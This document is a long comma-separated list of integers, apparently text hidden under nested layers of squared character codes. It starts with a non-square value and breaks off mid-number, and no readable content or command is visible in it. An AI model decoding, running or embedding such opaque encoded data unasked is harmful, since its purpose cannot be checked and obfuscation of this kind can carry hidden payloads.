916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2809,2704,3025,2916,1936,2809,2401,3136,2704,1936,3025,2601,3249,2916,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2500,3249,3249,2916,1936,2916,3136,3136,3249,1936,2401,2401,2704,2704,3249,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2704,2500,2500,2809,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2401,2704,2401,2916,2401,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2809,2601,2500,3249,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2809,2601,2500,3249,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,3249,2704,2304,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2401,2500,2601,2916,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,3249,3136,2304,2401,1936,3025,3025,2704,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2401,2500,2601,2916,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2500,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2809,3249,2500,3249,1936,2500,2916,2304,2401,1936,2401,2500,3249,3249,2916,1936,3136,2401,2304,2304,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2401,2500,2601,2916,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,3249,3136,2304,2401,1936,2916,2809,2916,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,3249,2704,2304,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2401,2704,2916,2704,2401,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2704,2809,2916,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,3249,2704,2304,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2500,2916,2304,2401,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2401,2704,2401,2916,2401,1936,2500,2809,2304,2304,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,3249,2916,1936,2401,2601,2704,2809,2916,1936,2500,2916,2304,2401,1936,2809,3025,3025,2916,1936,3249,2304,2500,2809,1936,2401,2500,3249,3249,2916,1936,2704,2500,2500,2809,1936,3249,2304,2500,2809,1936,2704,2500,2500,2809,1936,3136,2401,2304,2304,1936,2916,3136,3136,3249,1936,2401,2704,2704,2304,2304,1936,2401,2304,3136,2401,2916,1936,2809,3025,3025,2916,1936,2401,2601,2704,2809,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,3249,2704,2304,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2401,2704,2916,2704,2401,1936,2500,2916,2304,2401,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,3249,2704,2304,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2500,2916,2304,2401,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2809,3249,2500,3249,1936,2500,2916,2304,2401,1936,2401,2500,3249,3249,2916,1936,3136,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,3136,2401,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2704,2809,2916,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2809,3025,3025,2916,1936,2809,2304,2704,2401,1936,2401,2500,2809,2704,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2809,2916,2500,2809,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2500,2916,2304,2401,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,3249,2601,2916,1936,3249,3136,2304,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,3025,2500,2500,2809,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2916,2304,3136,2704,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2601,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,23